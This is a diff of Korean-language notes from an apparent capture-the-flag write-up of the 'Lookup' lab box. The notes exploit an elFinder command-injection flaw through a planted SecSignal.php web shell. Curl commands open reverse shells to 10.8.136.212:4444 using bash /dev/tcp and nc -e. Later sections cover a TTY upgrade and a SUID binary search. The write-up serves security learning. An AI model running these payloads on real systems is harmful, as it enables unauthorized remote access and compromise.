@@ -378,7 +378,7 @@ Exploit Title | Path
 ---
 
 elFinder 2 - Remote Command Execution (via | php/webapps/36925.py
-elFinder 2.1.47 - 'PHP connector' Command | php/webapps/46481.py
+elFinder 2.1.47 - 'PHP connector' Command | php/webapps/46481.py #
 elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
 elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
 elFinder Web file manager Version - 2.1.53 | php/webapps/51864.txt
@@ -432,25 +432,101 @@ $ ls
 {"error":["errUnknownCmd"]}
 $
 
-# 진짜 jpg 로 바꾸고 실행하니 에러 -> 하지만?
+# https://velog.io/@agnusdei1207/46481-CVE-2019-9194
+
+# 진짜 jpg 로 바꾸고 실행하니 에러 -> 하지만 경로에 접근해보니 SecSignal.php 파일이 생성되어 있음
 
 http://files.lookup.thm/elFinder/php
 
-- 위 경로에 접근해보니 SecSignal.php 파일이 생성되어 있음!
-- command inject success
+# cmd injection
 
-# 브라우저에서 -> http://files.lookup.thm/elFinder/php?c=ls
+http://files.lookup.thm/elFinder/php?c=ls
 
-접속 URL:
+# 접속 URL:
 
 ```bash
+# me
+sudo apt install netcat-traditional
+nc -lvnp 4444
+
 # fail
-http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/sh -i >& /dev/tcp/10.8.136.212/4444 0>&1
+curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/sh -i >& /dev/tcp/10.8.136.212/4444 0>&1
 
 # success
 # bash
-http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
+curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
 # sh
-http://files.lookup.thm/elFinder/php/SecSignal.php?c=nc+10.8.136.212+4444+-e+/bin/sh
-
+curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=nc+10.8.136.212+4444+-e+/bin/sh
 ```
+
+# tty 획득
+
+```bash
+control + z
+# 로컬: 현재의 리버스쉘을 백그라운드 실행
+
+stty raw -echo
+# stty : 터미널 속성 제어 명령어
+# raw : 키 입력을 가공하지 않고 있는 그대로(원시 상태) 터미널로 전달
+#         → Ctrl+C, Ctrl+Z 등 특수키도 바로 쉘로 전달됨
+# -echo : 입력한 키가 화면에 표시되지 않도록 끔
+#         → 쉘이 제대로 입력받을 수 있도록 키 입력 출력 억제
+
+fg
+# 백그라운드(중단)된 프로세스를 포그라운드로 불러옴
+# 쉘을 일시 중단(Ctrl+Z)한 뒤 다시 활성화하는 명령어
+
+export TERM=xterm
+# TERM 환경 변수 설정
+# xterm은 일반적인 터미널 타입으로, 방향키 등 키보드 제어 정상 작동을 도와줌
+# 올바른 터미널 타입 설정으로 쉘 내 키보드 입력 문제 해결
+
+reset
+# 터미널 초기화 명령어
+# 터미널 화면이 깨지거나 이상해졌을 때 원래 상태로 복구
+# 키 입력이나 화면 출력 문제 해결에 도움
+```
+
+# find / -perm -4000 4>/dev/null
+
+www-data@ip-10-10-248-63:/var/www/files.lookup.thm/public_html/elFinder/php$ find / -perm -4000 2>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
